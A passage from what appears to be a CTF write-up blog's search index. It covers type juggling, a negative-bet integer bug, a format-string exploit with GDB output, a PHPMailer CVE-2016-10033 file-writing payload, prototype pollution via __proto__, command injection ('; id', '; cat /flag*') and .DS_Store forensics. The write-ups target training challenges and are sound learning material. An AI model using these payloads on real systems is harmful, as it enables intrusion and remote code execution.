comparisons like ===, so Type Juggling is not exploitable\u0026hellip;\nFlag But let\u0026rsquo;s try anyway:\n$ curl 159.65.49.148:31883/api/getfacts -d '{\"type\":\"secrets\"}' {\"message\":\"Currently this type can be only accessed through localhost!\"} $ curl 159.65.49.148:31883/api/getfacts -d '{\"type\":1}' {\"message\":\"Invalid type!\"} $ curl 159.65.49.148:31883/api/getfacts -d '{\"type\":0}' {\"message\":\"Invalid type!\"} $ curl 159.65.49.148:31883/api/getfacts -d '{\"type\":\"1\"}' {\"message\":\"Invalid type!\"} $ curl 159.65.49.148:31883/api/getfacts -d '{\"type\":{}}' {\"message\":\"Invalid type!\"} $ curl 159.65.49.148:31883/api/getfacts -d '{\"type\":[]}' {\"message\":\"Invalid type!\"} $ curl 159.65.49.148:31883/api/getfacts -d '{\"type\":true}' {\"facts\":[{\"id\":19,\"fact\":\"HTB{sw1tch_stat3m3nts_4r3_vuln3r4bl3!!!}\",\"fact_type\":\"secrets\"}]}  So it looks like switch(true) will execute the first option, which happens to be $this-\u0026gt;facts-\u0026gt;get_facts('secrets').\n","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/juggling-facts/","section":"ctf","summary":"PHP. Type Juggling","time":2,"title":"Juggling Facts"},{"contents":"We are given a service that consists of a betting system. We bet a certain amount of money and we need to guess a number between 1 and 10 in less than 10 attempts. For example:\n$ nc thekidofarcrania.com 10001 Welcome to the Game of Luck !. Rules of the Game : (1) You will be Given 500$ (2) Place a Bet (3) Guess the number what computer thinks of ! (4) computer's number changes every new time !. (5) You have to guess a number between 1-10 (6) You have only 10 tries !. (7) If you guess a number  10, it still counts as a Try ! (8) Put your mind, Win the game !.. (9) If you guess within the number of tries, you win money ! (10) Good Luck !.. theKidOfArcrania: I bet you cannot get past $1000000! Are you ready? Y/N : y Money you have : 500$ Place a Bet : 500 Loading : ⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛ 100% The Game is On, Good Luck !.. Make a Guess : 3 Computer's number : 7 Your Guess : 3 Sorry Wrong Guess, Try Again !. -_- Make a Guess : 3 Computer's number : 3 Your Guess : 3 Sorry Wrong Guess, Try Again !. -_- You made it !. You won JACKPOT !.. You thought of what computer thought !. Your balance has been updated ! Current balance : 1500$ Want to play again? Y/N : n Thank you for playing ! Made by John_123 Small mods by theKidOfArcrania Give it a (+1) if you like !..  However, if we lose the game, out balance will decrease:\n$ python3 -c 'print(\"y\\n500\\n\" + \"0\\n\" * 10 + \"n\")' | nc thekidofarcrania.com 10001 Welcome to the Game of Luck !. Rules of the Game : (1) You will be Given 500$ (2) Place a Bet (3) Guess the number what computer thinks of ! (4) computer's number changes every new time !. (5) You have to guess a number between 1-10 (6) You have only 10 tries !. (7) If you guess a number  10, it still counts as a Try ! (8) Put your mind, Win the game !.. (9) If you guess within the number of tries, you win money ! (10) Good Luck !.. theKidOfArcrania: I bet you cannot get past $1000000! Are you ready? Y/N : Money you have : 500$ Place a Bet : Loading : ⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛ 100% The Game is On, Good Luck !.. Make a Guess : Computer's number : 7 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 3 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 4 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 3 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 9 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 5 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 3 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 2 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 2 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 3 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Sorry you didn't made it ! Play Again !... Better Luck next Time !. Sorry you lost some money !.. Your balance has been updated !. Current balance :  : 0$ Want to play again? Y/N : Thank you for playing ! Made by John_123 Small mods by theKidOfArcrania Give it a (+1) if you like !..  The objective is to have more than 1000000. The key here is that we can bet negative numbers, and if we lose, our new balance will be the current one minus our bet, so we can enter a negative value such as -1000000 and lose the game so that we end up having 1000500:\n$ python3 -c 'print(\"y\\n-1000000\\n\" + \"0\\n\" * 10 + \"n\")' | nc thekidofarcrania.com 10001 Welcome to the Game of Luck !. Rules of the Game : (1) You will be Given 500$ (2) Place a Bet (3) Guess the number what computer thinks of ! (4) computer's number changes every new time !. (5) You have to guess a number between 1-10 (6) You have only 10 tries !. (7) If you guess a number  10, it still counts as a Try ! (8) Put your mind, Win the game !.. (9) If you guess within the number of tries, you win money ! (10) Good Luck !.. theKidOfArcrania: I bet you cannot get past $1000000! Are you ready? Y/N : Money you have : 500$ Place a Bet : Loading : ⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛ 100% The Game is On, Good Luck !.. Make a Guess : Computer's number : 3 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 1 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 4 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 3 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 8 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 1 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 3 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 2 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 6 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 7 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Sorry you didn't made it ! Play Again !... Better Luck next Time !. Sorry you lost some money !.. Your balance has been updated !. Current balance :  : 1000500$ What the... how did you get that money (even when I tried to stop you)!? I guess you beat me! The flag is CTFlearn{d9029a08c55b936cbc9a30_i_wish_real_betting_games_were_like_this!} Thank you for playing ! Made by John_123 Small mods by theKidOfArcrania Give it a (+1) if you like !..  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/binary/lazy-game-challenge/","section":"ctf","summary":"Integer operations","time":6,"title":"Lazy Game Challenge"},{"contents":"We are given a 64-bit binary called leet_test:\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)  If we open it in Ghidra, we find this decompiled source code in C:\nuintwinner =0xcafebabe; voidmain() { longin_FS_OFFSET; uintrandom; inturandom_fd; intflag_fd; void*flag; charname[280]; longcanary; canary =*(long*) (in_FS_OFFSET +0x28); initialize(); urandom_fd =open(\"/dev/urandom\", 0); read(urandom_fd, \u0026amp;random, 4); close(urandom_fd); random =random \u0026amp;0xffff; while(true) { printf(\"Welcome to HTB!\\nPlease enter your name: \"); fgets(name, 256, stdin); printf(\"Hello, \"); printf(name); if(random *0x1337c0de==winner) break; puts(\"Sorry! You aren\\'t 1337 enough :(\\nPlease come back later\\n------------------------\"); } flag_fd =open(\"flag.txt\", 0); flag =malloc(256); read(flag_fd, flag, 256); close(flag_fd); printf(\"\\nCome right in! %s\\n\", flag); /* WARNING: Subroutine does not return */ exit(0); }  Here we have a Format String vulnerability since there is a call to printf using as first argument a variable controlled by the user. Hence, we can insert formats and potentially dump values from the stack and also write in arbitrary memory addresses. Let\u0026rsquo;s test it:\n$ ./leet_test Welcome to HTB! Please enter your name: %lx Hello, 7ffcc59f23e0 Sorry! You aren't 1337 enough :( Please come back later ------------------------ Welcome to HTB! Please enter your name: %lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx Hello, 7ffcc59f23e0.0.0.7.7.0.9e5900000240.34000000003.58000000380.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.9000a786c25.98000000980 Sorry! You aren't 1337 enough :( Please come back later ------------------------ Welcome to HTB! Please enter your name: ^C  We see that the %lx is replaced by a hexadecimal number (7ffcc59f23e0). This is a memory address from the stack. In fact, if we insert a ton of %lx, we will see that our input string is also placed on the stack. We can find it at position 10 (2e786c252e786c25 is %lx.%lx. as bytes, little-endian format).\nSo, we can read values on the stack using a different notation. For instance, we can control values from offset 10:\n$ ./leet_test Welcome to HTB! Please enter your name: AAAABBBB.%10$lx Hello, AAAABBBB.4242424241414141 Sorry! You aren't 1337 enough :( Please come back later ------------------------ Welcome to HTB! Please enter your name: %11$lx..AAAABBBB Hello, 4242424241414141..AAAABBBB Sorry! You aren't 1337 enough :( Please come back later ------------------------ Welcome to HTB! Please enter your name: ^C  The objective of the challenge is to pass the check random * 0x1337c0de == winner. First, it will be useful to know the value of random, which is computed at the start. Let\u0026rsquo;s use GDB to find it out:\n$ gdb -q leet_test Reading symbols from leet_test... (No debugging symbols found in leet_test) gef➤ disassemble main Dump of assembler code for function main: 0x00000000004012ca \u0026lt;+0\u0026gt;: endbr64 0x00000000004012ce \u0026lt;+4\u0026gt;: push rbp 0x00000000004012cf \u0026lt;+5\u0026gt;: mov rbp,rsp 0x00000000004012d2 \u0026lt;+8\u0026gt;: sub rsp,0x140 0x00000000004012d9 \u0026lt;+15\u0026gt;: mov rax,QWORD PTR fs:0x28 0x00000000004012e2 \u0026lt;+24\u0026gt;: mov QWORD PTR [rbp-0x8],rax 0x00000000004012e6 \u0026lt;+28\u0026gt;: xor eax,eax 0x00000000004012e8 \u0026lt;+30\u0026gt;: mov eax,0x0 0x00000000004012ed \u0026lt;+35\u0026gt;: call 0x401256 \u0026lt;initialize\u0026gt; 0x00000000004012f2 \u0026lt;+40\u0026gt;: mov esi,0x0 0x00000000004012f7 \u0026lt;+45\u0026gt;: lea rdi,[rip+0xd0a] # 0x402008 0x00000000004012fe \u0026lt;+52\u0026gt;: mov eax,0x0 0x0000000000401303 \u0026lt;+57\u0026gt;: call 0x401150 \u0026lt;open@plt\u0026gt; 0x0000000000401308 \u0026lt;+62\u0026gt;: mov DWORD PTR [rbp-0x130],eax 0x000000000040130e \u0026lt;+68\u0026gt;: lea rcx,[rbp-0x134] 0x0000000000401315 \u0026lt;+75\u0026gt;: mov eax,DWORD PTR [rbp-0x130] 0x000000000040131b \u0026lt;+81\u0026gt;: mov edx,0x4 0x0000000000401320 \u0026lt;+86\u0026gt;: mov rsi,rcx 0x0000000000401323 \u0026lt;+89\u0026gt;: mov edi,eax 0x0000000000401325 \u0026lt;+91\u0026gt;: mov eax,0x0 0x000000000040132a \u0026lt;+96\u0026gt;: call 0x401110 \u0026lt;read@plt\u0026gt; 0x000000000040132f \u0026lt;+101\u0026gt;: mov eax,DWORD PTR [rbp-0x130] 0x0000000000401335 \u0026lt;+107\u0026gt;: mov edi,eax 0x0000000000401337 \u0026lt;+109\u0026gt;: mov eax,0x0 0x000000000040133c \u0026lt;+114\u0026gt;: call 0x401100 \u0026lt;close@plt\u0026gt; 0x0000000000401341 \u0026lt;+119\u0026gt;: mov eax,DWORD PTR [rbp-0x134] 0x0000000000401347 \u0026lt;+125\u0026gt;: movzx eax,ax 0x000000000040134a \u0026lt;+128\u0026gt;: mov DWORD PTR [rbp-0x134],eax 0x0000000000401350 \u0026lt;+134\u0026gt;: lea rdi,[rip+0xcc1] # 0x402018 0x0000000000401357 \u0026lt;+141\u0026gt;: mov eax,0x0 0x000000000040135c \u0026lt;+146\u0026gt;: call 0x4010e0 \u0026lt;printf@plt\u0026gt; 0x0000000000401361 \u0026lt;+151\u0026gt;: mov rdx,QWORD PTR [rip+0x2d28] # 0x404090 \u0026lt;stdin@@GLIBC_2.2.5\u0026gt; 0x0000000000401368 \u0026lt;+158\u0026gt;: lea rax,[rbp-0x120] 0x000000000040136f \u0026lt;+165\u0026gt;: mov esi,0x100 0x0000000000401374 \u0026lt;+170\u0026gt;: mov rdi,rax 0x0000000000401377 \u0026lt;+173\u0026gt;: call 0x401120 \u0026lt;fgets@plt\u0026gt; 0x000000000040137c \u0026lt;+178\u0026gt;: lea rdi,[rip+0xcbe] # 0x402041 0x0000000000401383 \u0026lt;+185\u0026gt;: mov eax,0x0 0x0000000000401388 \u0026lt;+190\u0026gt;: call 0x4010e0 \u0026lt;printf@plt\u0026gt; 0x000000000040138d \u0026lt;+195\u0026gt;: lea rax,[rbp-0x120] 0x0000000000401394 \u0026lt;+202\u0026gt;: mov rdi,rax 0x0000000000401397 \u0026lt;+205\u0026gt;: mov eax,0x0 0x000000000040139c \u0026lt;+210\u0026gt;: call 0x4010e0 \u0026lt;printf@plt\u0026gt; 0x00000000004013a1 \u0026lt;+215\u0026gt;: mov eax,DWORD PTR [rbp-0x134] 0x00000000004013a7 \u0026lt;+221\u0026gt;: imul edx,eax,0x1337c0de 0x00000000004013ad \u0026lt;+227\u0026gt;: mov eax,DWORD PTR [rip+0x2cc5] # 0x404078 \u0026lt;winner\u0026gt; 0x00000000004013b3 \u0026lt;+233\u0026gt;: cmp edx,eax 0x00000000004013b5 \u0026lt;+235\u0026gt;: jne 0x4013be \u0026lt;main+244\u0026gt; 0x00000000004013b7 \u0026lt;+237\u0026gt;: mov eax,0x1 0x00000000004013bc \u0026lt;+242\u0026gt;: jmp 0x4013c3 \u0026lt;main+249\u0026gt; 0x00000000004013be \u0026lt;+244\u0026gt;: mov eax,0x0 0x00000000004013c3 \u0026lt;+249\u0026gt;: test al,al 0x00000000004013c5 \u0026lt;+251\u0026gt;: je 0x401450 \u0026lt;main+390\u0026gt; 0x00000000004013cb \u0026lt;+257\u0026gt;: mov esi,0x0 0x00000000004013d0 \u0026lt;+262\u0026gt;: lea rdi,[rip+0xc72] # 0x402049 0x00000000004013d7 \u0026lt;+269\u0026gt;: mov eax,0x0 0x00000000004013dc \u0026lt;+274\u0026gt;: call 0x401150 \u0026lt;open@plt\u0026gt; 0x00000000004013e1 \u0026lt;+279\u0026gt;: mov DWORD PTR [rbp-0x12c],eax 0x00000000004013e7 \u0026lt;+285\u0026gt;: mov edi,0x100 0x00000000004013ec \u0026lt;+290\u0026gt;: call 0x401130 \u0026lt;malloc@plt\u0026gt; 0x00000000004013f1 \u0026lt;+295\u0026gt;: mov QWORD PTR [rbp-0x128],rax 0x00000000004013f8 \u0026lt;+302\u0026gt;: mov rcx,QWORD PTR [rbp-0x128] 0x00000000004013ff \u0026lt;+309\u0026gt;: mov eax,DWORD PTR [rbp-0x12c] 0x0000000000401405 \u0026lt;+315\u0026gt;: mov edx,0x100 0x000000000040140a \u0026lt;+320\u0026gt;: mov rsi,rcx 0x000000000040140d \u0026lt;+323\u0026gt;: mov edi,eax 0x000000000040140f \u0026lt;+325\u0026gt;: mov eax,0x0 0x0000000000401414 \u0026lt;+330\u0026gt;: call 0x401110 \u0026lt;read@plt\u0026gt; 0x0000000000401419 \u0026lt;+335\u0026gt;: mov eax,DWORD PTR [rbp-0x12c] 0x000000000040141f \u0026lt;+341\u0026gt;: mov edi,eax 0x0000000000401421 \u0026lt;+343\u0026gt;: mov eax,0x0 0x0000000000401426 \u0026lt;+348\u0026gt;: call 0x401100 \u0026lt;close@plt\u0026gt; 0x000000000040142b \u0026lt;+353\u0026gt;: mov rax,QWORD PTR [rbp-0x128] 0x0000000000401432 \u0026lt;+360\u0026gt;: mov rsi,rax 0x0000000000401435 \u0026lt;+363\u0026gt;: lea rdi,[rip+0xc16] # 0x402052 0x000000000040143c \u0026lt;+370\u0026gt;: mov eax,0x0 0x0000000000401441 \u0026lt;+375\u0026gt;: call 0x4010e0 \u0026lt;printf@plt\u0026gt; 0x0000000000401446 \u0026lt;+380\u0026gt;: mov edi,0x0 0x000000000040144b \u0026lt;+385\u0026gt;: call 0x401160 \u0026lt;exit@plt\u0026gt; 0x0000000000401450 \u0026lt;+390\u0026gt;: lea rdi,[rip+0xc11] # 0x402068 0x0000000000401457 \u0026lt;+397\u0026gt;: call 0x4010d0 \u0026lt;puts@plt\u0026gt; 0x000000000040145c \u0026lt;+402\u0026gt;: jmp 0x401350 \u0026lt;main+134\u0026gt; End of assembler dump. gef➤ break *main+221 Breakpoint 1 at 0x4013a7 gef➤ run Starting program: ./leet_test Welcome to HTB! Please enter your name: %lx Hello, 7fffffffbe90 Breakpoint 1, 0x00000000004013a7 in main ()  gef➤ x/i $rip =\u0026gt; 0x4013a7 \u0026lt;main+221\u0026gt;: imul edx,eax,0x1337c0de gef➤ p/x $rax $1 = 0x15c0  gef➤ x/20gx $rsp 0x7fffffffe530: 0x0000000000000000 0x000015c000000240 0x7fffffffe540: 0x0000034000000003 0x0000058000000380 0x7fffffffe550: 0x000009000a786c25 0x0000098000000980 0x7fffffffe560: 0x0000098000000980 0x0000098000000980 0x7fffffffe570: 0x0000098000000980 0x0000098000000980 0x7fffffffe580: 0x0000098000000980 0x0000098000000980 0x7fffffffe590: 0x0000098000000980 0x0000098000000980 0x7fffffffe5a0: 0x0000098000000980 0x0000098000000980 0x7fffffffe5b0: 0x0000000000000000 0x0000000000000100 0x7fffffffe5c0: 0x0000004000000000 0x0000040000000200 gef➤ grep %lx [+] Searching '%lx' in memory [+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw- 0x7fffffffe550 - 0x7fffffffe555 → \"%lx\\n\"  gef➤ c Continuing. Sorry! You aren't 1337 enough :( Please come back later ------------------------ Welcome to HTB! Please enter your name: %7$lx Hello, 15c000000240 Breakpoint 1, 0x00000000004013a7 in main ()  Alright, now we have the offset where we will find the random value (upper 2 bytes):\n$ ./leet_test Welcome to HTB! Please enter your name: %7$lx Hello, 3d8300000240 Sorry! You aren't 1337 enough :( Please come back later ------------------------ Welcome to HTB! Please enter your name: ^C $ ./leet_test Welcome to HTB! Please enter your name: %7$lx Hello, f59700000240 Sorry! You aren't 1337 enough :( Please come back later ------------------------ Welcome to HTB! Please enter your name: ^C $ ./leet_test Welcome to HTB! Please enter your name: %7$lx Hello, 73200000240 Sorry! You aren't 1337 enough :( Please come back later ------------------------ Welcome to HTB! Please enter your name: ^C  At this point, we will know what is the result of random * 0x1337c0de. However, it won\u0026rsquo;t be 0xcafebabe (which is the value of winner). So, what we can do? Well, actually Format String vulnerabilities also enable us to write data into arbitrary memory using %n. The way this format works is that it stores the number of bytes printed up to the format (%n) into the address pointed by the format.\nSince we control the stack from offset 10, we can enter here an address where we want to write to. The address of winner is known (0x404078), because the binary has no PIE:\n$ readelf -s leet_test | grep winner 72: 0000000000404078 4 OBJECT GLOBAL DEFAULT 25 winner  In order to write a large amount of data, we can use %c. So, the idea is:\n Leak the value of random Compute random * 0x1337c0de Modify the value of winner accordingly  You can find more information regarding Format String exploitation in my Format write-up, in my Space Pirate: Entrypoint write-up or in my Rope write-up . I also recommend watching some YouTube videos by LiveOverflow, which are great.\nManual Format String exploitation for writing values can be a bit tedious, but pwntools comes into our rescue with a function called fmtstr_payload, which takes the offset where we can control our format string and a dictionary mapping the address where we want to write and the value we want to write. With these, we can achieve the above steps and find the flag:\n$ python3 solve.py 138.68.162.164:32700 [*] './leet_test' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [+] Opening connection to 138.68.162.164 on port 32700: Done b'HTB{y0u_sur3_r_1337_en0ugh!!}\\n' [*] Closed connection to 138.68.162.164 port 32700  The full exploit can be found in here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/pwn/leet-test/","section":"ctf","summary":"64-bit binary. Format String vulnerability","time":7,"title":"Leet Test"},{"contents":"We are provided with this webpage:\nIt shows a directory listing. If we go to /mailer.php we will have this website to send emails:\nThe mailer.zip file contains the mailer.php source code. It is quite large to insert it here.\nThe key thing is that it uses PHPMailer, which is vulnerable to CVE-2016-10033 and CVE-2016-10045. In fact, there are public exploits like the one in www.exploit-db.com.\nBasically, the exploit says to enter this payload as the email:\n\"attacker\\\" -oQ/tmp/ -X/var/www/html/phpcode.php some \"@email.com  And then enter some PHP code at the email list. For example, we can try to load phpinfo():\nAnd in fact, we have created a file called phpcode.php with the phpinfo() inside:\nNow it\u0026rsquo;s time to get Remote Code Execution:\nNow we can search for the flag and capture it:\n","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/web/letter-dispair/","section":"ctf","summary":"PHP. Remote Code Execution. PHPMailer (CVE)","time":1,"title":"Letter Dispair"},{"contents":"We are supposed to log in here: http://puzzler7.imaginaryctf.org:5001/:\nIf we inspect the HTML code, we will see a comment that points to /source:\nSo we have the source code used by the server:\nconstexpress=require('express') constcrypto=require('crypto') functionmd5(text) { returncrypto.createHash('md5').update(text).digest('hex') } constapp=express() constusers={ guest: '084e0343a0486ff05530df6c705c8bb4', admin: '21232f297a57a5a743894a0e4a801fc3', '1337hacker': '2ab96390c7dbe3439de74d0c9b0b1767' } constlocalIPs=['127.0.0.1', '::1', '::ffff:127.0.0.1'] app.use(express.urlencoded({ extended: false})) app.use(express.json()) app.get('/', (req, res) =\u0026gt;{ res.send(` \u0026lt;form action=\"/login\" method=\"POST\"\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\"username\"\u0026gt;Username: \u0026lt;/label\u0026gt; \u0026lt;input name=\"username\" type=\"text\" id=\"username\"\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\"password\"\u0026gt;Password: \u0026lt;/label\u0026gt; \u0026lt;input name=\"password\" type=\"password\" id=\"password\"\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button type=\"submit\"\u0026gt;Login\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;!-- /source --\u0026gt; `) }) app.post('/login', (req, res) =\u0026gt;{ if(req.body.username ==='admin'\u0026amp;\u0026amp;!localIPs.includes(req.ip)) { returnres.end('Admin is only allowed from localhost') } constauth=Object.assign({}, req.body) if(users[auth.username] ===md5(auth.password)) { if(auth.username ==='admin') { res.end(`Welcome admin! The flag is ${process.env.FLAG}`) } else{ res.end(`Welcome ${auth.username}!`) } } else{ res.end('Invalid username or password') } }) app.get('/source', (req, res) =\u0026gt;{ res.sendFile(__filename) }) app.get('/package.json', (req, res) =\u0026gt;{ res.sendFile('package.json', { root: __dirname}) }) constport=5001||process.env.PORT app.listen(port, () =\u0026gt;{ console.log(`Server running on http://localhost:${port}`) })  It is a website built with Express JS, in JavaScript (Node.js).\nWe see that the passwords are checked with MD5 against some hard-coded hashes. We would like to access as admin, whose hashed password is 21232f297a57a5a743894a0e4a801fc3. If we enter it in crackstation.net, we will find out that the password is admin too:\nBut we cannot get the flag because the request IP is not 127.0.0.1:\n$ curl puzzler7.imaginaryctf.org:5001/login -d '{\"username\":\"admin\",\"password\":\"admin\"}' -H 'Content-Type: application/json' Admin is only allowed from localhost  However, after that check, there is a call to Object.assign({}, req.body). Here we have a Prototype Pollution vulnerability, so we can set default properties for every object (more information at security.snyk.io).\nIn order to pass the if check, we can skip the username and password fields, and set them as the prototype for every object as follows:\n$ curl puzzler7.imaginaryctf.org:5001/login -d '{\"__proto__\":{\"username\":\"admin\",\"password\":\"admin\"}}' -H 'Content-Type: application/json' Welcome admin! The flag is ictf{omg_js_why_are_you_doing_this_to_me}  ","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/login-please/","section":"ctf","summary":"ImaginaryCTF 12/09/2022. 75 points. MD5 hash. Prototype Pollution","time":2,"title":"Login Please"},{"contents":"We are given a large text file called anthem.flag.txt:\n$ wc -l anthem.flag.txt 2146 anthem.flag.txt  2146 are a lot to search the flag by hand. Instead, we can use grep to find the flag given that they have a special format format (picoCTF{...}):\n$ grep picoCTF anthem.flag.txt we think that the men of picoCTF{gr3p_15_@w3s0m3_4c479940}  ","image":"/images/forensics.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/forensics/lookey-here/","section":"ctf","summary":"picoCTF 2022. 100 points. Find pattern","time":1,"title":"Lookey here"},{"contents":"We are provided with this webpage:\nThere is a feature to use ping command:\nThe problem might be related to command injection, because probably the server does something like this:\n\u0026lt;?php $cmd ='ping -c 4 '.$_POST['ip_address']; system($cmd);  Maybe not in PHP, but the concept is the same. Hence, we can try and add a semicolon to inject another system command (; id):\nThere it is, the server is vulnerable to command injection, which derives in Remote Code Execution (RCE). Let\u0026rsquo;s find the flag file (; find / -name flag\\* 2\u0026gt;/dev/null):\nAlright, now, let\u0026rsquo;s use ; cat /flag_oZgiV (we could have also used ; cat /flag*):\nAnd the flag is: HTB{I_f1n4lly_l00k3d_thr0ugh_th3_rc3}.\n","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/web/looking-glass/","section":"ctf","summary":"Command injection. Remote Code Execution","time":1,"title":"looking glass"},{"contents":"We have a ZIP file called flag.zip that contains a JPEG image and also a .DS_Store file, which is a temporary file for macOS machines:\n$ file flag.zip flag.zip: Zip archive data, at least v2.0 to extract, compression method=store $ unzip -v flag.zip Archive: flag.zip Length Method Size Cmpr Date Time CRC-32 Name -------- ------ ------- ---- ---------- ----- -------- ---- 0 Stored 0 0% 07-03-2022 05:49 00000000 flag/ 86710 Defl:N 86391 0% 07-03-2022 05:29 a0cfb753 flag/flag.jpg 719 Defl:N 419 42% 07-03-2022 05:29 58f33cf2 __MACOSX/flag/._flag.jpg 6148 Defl:N 283 95% 07-03-2022 05:48 c093d238 flag/.DS_Store 120 Defl:N 53 56% 07-03-2022 05:48 38c0880b __MACOSX/flag/._.DS_Store -------- ------- --- ------- 93697 87146 7% 5 files $ unzip flag.zip Archive: flag.zip creating: flag/ inflating: flag/flag.jpg inflating: __MACOSX/flag/._flag.jpg inflating: flag/.DS_Store inflating: __MACOSX/flag/._.DS_Store  These temporary files contain useful information about directories and filenames. We can extract the information simply using cat:\n$ cat flag/.DS_Store .jpgIloflag.jpgIlocblob�������!ictf{mac_is_better_than_templeos}Ilocblob�������� @� @ @ @ DSDB ` @ @ @  Or we can use a tool called Python-dsstore:\n$ python3 main.py flag/.DS_Store Count: 2 flag.jpg ictf{mac_is_better_than_templeos}  ","image":"/images/forensics.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/lost-flag/","section":"ctf","summary":"ImaginaryCTF 04/07/2022. 75 points. ZIP archive. macOS (.DS_Store)","time":1,"title":"Lost Flag"},{"contents":"This is a lab to practice some exploitation techniques, programming and reverse engineering. The lab consists of 9 levels, using a Linux/x86 architecture (all protections are disabled: NX, PIE, canaries, and even ASLR).\nTo connect to the first level, we are provided with the SSH credentials for maze0.\nThe initial recognition of the machine tells us that we have some SUID binaries that will be exploited to pass to the next level. Moreover, we have some files that contain the password for users mazeX:\nmaze0@maze:~$ ls -lh /maze total 88K -r-sr-x--- 1 maze1 maze0 8.1K Aug 26 2019 maze0 -r-sr-x--- 1 maze2 maze1 7.2K Aug 26 2019 maze1 -r-sr-x--- 1 maze3 maze2 7.3K Aug 26 2019 maze2 -r-sr-x--- 1 maze4 maze3 732 Aug 26 2019 maze3 -r-sr-x--- 1 maze5 maze4 10K Aug 26 2019 maze4 -r-sr-x--- 1 maze6 maze5 9.2K Aug 26 2019 maze5 -r-sr-x--- 1 maze7 maze6 8.0K Aug 26 2019 maze6 -r-sr-x--- 1 maze8 maze7 9.7K Aug 26 2019 maze7 -r-sr-x--- 1 maze9 maze8 12K Aug 26 2019 maze8 maze0@maze:~$ ls -lh /etc/maze_pass total 40 -r-------- 1 maze0 maze0 6 Aug 26 2019 maze0 -r-------- 1 maze1 maze1 11 Aug 26 2019 maze1 -r-------- 1 maze2 maze2 11 Aug 26 2019 maze2 -r-------- 1 maze3 maze3 11 Aug 26 2019 maze3 -r-------- 1 maze4 maze4 11 Aug 26 2019 maze4 -r-------- 1 maze5 maze5 11 Aug 26 2019 maze5 -r-------- 1 maze6 maze6 11 Aug 26 2019 maze6 -r-------- 1 maze7 maze7 11 Aug 26 2019 maze7 -r-------- 1 maze8 maze8 11 Aug 26 2019 maze8 -r-------- 1 maze9 maze9 11 Aug 26 2019 maze9  The file permissions are properly set so that everything works for each level.\nLevel 0 -\u0026gt; 1 We can transfer /maze/maze0 to our machine copying the file encoded in Base64. Then we can open it in Ghidra and obtain the decompiled C source code:\nint main(int argc, char **argv) { int iVar1; __uid_t __suid; __uid_t __euid; __uid_t __ruid; char buf[20]; int fd; memset(buf, 0, 0x14); iVar1 = access(\"/tmp/128ecf542a35ac5270a87dc740918404\", 4); if (iVar1 == 0) { __suid = geteuid(); __euid = geteuid(); __ruid = geteuid(); setresuid(__ruid, __euid, __suid); iVar1 = open(\"/tmp/128ecf542a35ac5270a87dc740918404\", 0); if (iVar1 \u0026lt; 0) { /* WARNING: Subroutine does not return */ exit(-1); } read(iVar1, buf, 0x13); write(1, buf, 0x13); } return 0; }  We see that it is accessing a file at /tmp/128ecf542a35ac5270a87dc740918404. If the access is granted, then it reads the content and prints it to standard output (stdout).\nLet\u0026rsquo;s see what permissions we have in /tmp:\nmaze0@maze:~$ ls -l --time-style=+ / total 148 drwxr-xr-x 2 root root 4096 bin drwxr-xr-x 4 root root 4096 boot dr-xr-xr-x 3 root root 0 cgroup2 drwxr-xr-x 14 root root 4020 dev drwxr-xr-x 88 root root 4096 etc drwxr-xr-x 12 root root 4096 